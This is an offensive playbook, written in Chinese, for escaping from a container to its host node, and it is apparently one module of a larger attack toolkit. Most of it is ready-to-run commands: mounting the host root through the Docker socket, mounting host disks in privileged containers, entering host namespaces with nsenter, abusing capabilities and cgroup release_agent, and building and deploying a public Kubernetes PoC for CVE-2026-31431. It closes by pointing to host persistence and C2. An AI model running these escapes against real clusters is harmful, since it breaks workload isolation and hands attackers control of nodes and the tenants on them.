# Container → Node Escape

按**当前暴露原语**而不是固定漏洞清单选择路径。

## 1. 环境基线

```bash
id
uname -a
cat /etc/os-release
cat /proc/1/cgroup
mount
cat /proc/self/status | grep -E 'Cap(Inh|Prm|Eff|Bnd)'
capsh --print 2>/dev/null
ls -l /var/run/docker.sock /run/containerd/containerd.sock /var/run/crio/crio.sock 2>/dev/null
```

## 2. Docker socket

条件：可读写 `/var/run/docker.sock` 且宿主 Docker 接口可用。

```bash
docker ps
```

授权靶场可启动挂载宿主根目录的容器验证：

```bash
docker run --rm -it -v /:/host alpine chroot /host /bin/sh
```

成功：命名空间/文件系统确认已进入 host context。

## 3. containerd / CRI socket

检查：

```bash
ls -l /run/containerd/containerd.sock /var/run/crio/crio.sock 2>/dev/null
which crictl ctr nerdctl 2>/dev/null
```

能访问 socket 时先枚举容器/镜像；具体 create/run 命令随 runtime/CRI 版本变化，优先使用当前工具 `--help`，不要硬套 Docker CLI。

## 4. privileged + devices

```bash
fdisk -l 2>/dev/null
lsblk
```

如果宿主块设备可见且拥有 mount 权限：

```bash
mkdir -p /mnt/host
mount /dev/<HOST_PARTITION> /mnt/host
chroot /mnt/host /bin/sh
```

## 5. hostPath

如果 `/`、`/etc`、`/var/lib/kubelet`、runtime socket、`/root` 等宿主路径已挂载，先判断读/写能力。

```bash
mount | grep -E 'host|kubelet|docker|containerd'
```

可写宿主路径可能直接形成 Node 控制，不需要 kernel exploit。

## 6. hostPID

```bash
ps aux
ls -l /proc/1/ns
```

如果容器看到宿主 PID namespace 且拥有足够 capability：

```bash
nsenter -t 1 -m -u -i -n -p /bin/sh
```

## 7. Dangerous capabilities

常见：

```text
CAP_SYS_ADMIN  → mount / namespace / many kernel surfaces
CAP_SYS_PTRACE → process inspection/injection if namespace permits
CAP_SYS_MODULE → kernel module loading if host context permits
CAP_DAC_READ_SEARCH / DAC_OVERRIDE → host-mounted file access
CAP_NET_ADMIN / NET_RAW → network attack surface, not automatic escape
```

Capability 是条件，不等于必然逃逸。

## 8. cgroup release_agent

旧 cgroup v1 `release_agent` 技术是**版本/配置 gated**；现代 cgroup v2/修复环境不要默认可用。

先判断：

```bash
mount | grep cgroup
cat /proc/filesystems | grep cgroup
```

只有确认 cgroup v1 + writable release_agent path + required capability 时才考虑旧链。

## 9. CVE-2026-31431 Copy Fail

### 状态

Linux kernel 漏洞；Kubernetes cross-workload PoC 存在，但不是任意 Pod 通杀。

前置至少确认：

```text
节点 kernel / distro 未修复
AF_ALG 路径可用
能够运行攻击容器
PoC 所需共享镜像层/目标 privileged DaemonSet 条件存在
provider/runtime 条件匹配
```

### 版本门控

```bash
uname -r
cat /etc/os-release
```

根据 Ubuntu/Red Hat/云厂商安全公告判断 patched kernel，不能仅用上游版本号猜测。

### 公开 PoC

```bash
git clone https://github.com/Percivalll/Copy-Fail-CVE-2026-31431-Kubernetes-PoC
cd Copy-Fail-CVE-2026-31431-Kubernetes-PoC
make build
make docker-build
```

推送自己的镜像后按 provider：

```bash
make docker-push IMAGE=ghcr.io/<you>/copy-fail-poc TAG=latest

kubectl apply -f deploy/poc.yaml       # ACK/upstream 示例
kubectl apply -f deploy/poc-eks.yaml   # EKS 示例
kubectl apply -f deploy/poc-gke.yaml   # GKE 示例
```

必须先阅读仓库当前 README / manifests，确认目标镜像、DaemonSet、node affinity 与 provider 条件。

### 成功判断

公开 PoC 目前使用类似结果文件证明 node-context execution；以当前仓库 README 为准，不把固定路径写成跨版本保证。

### 清理

```bash
kubectl delete -f deploy/poc.yaml 2>/dev/null || true
kubectl delete -f deploy/poc-eks.yaml 2>/dev/null || true
kubectl delete -f deploy/poc-gke.yaml 2>/dev/null || true
```

同时按 PoC README 清理 node 上的结果文件/被重启 workload。

## 10. Runtime / Kernel CVE 原则

对于 runC/containerd/kernel 新漏洞：

```text
先 fingerprint runtime/kernel
→ 查官方 advisory / release notes
→ 确认 affected range
→ 确认当前容器前置条件
→ 再选稳定 PoC
```

不根据“某 CVE 很新”直接尝试。

## 11. Node root 后

Node root 成功只是 K8s/Container 提权结果。

```text
候选：
- 继续 /k8s 做 cluster credential/control-plane 分析
- /post 做 host OS persistence/C2
```

由操作者选择。

## Sources

- Copy Fail PoC: https://github.com/Percivalll/Copy-Fail-CVE-2026-31431-Kubernetes-PoC
- badPods: https://github.com/BishopFox/badPods
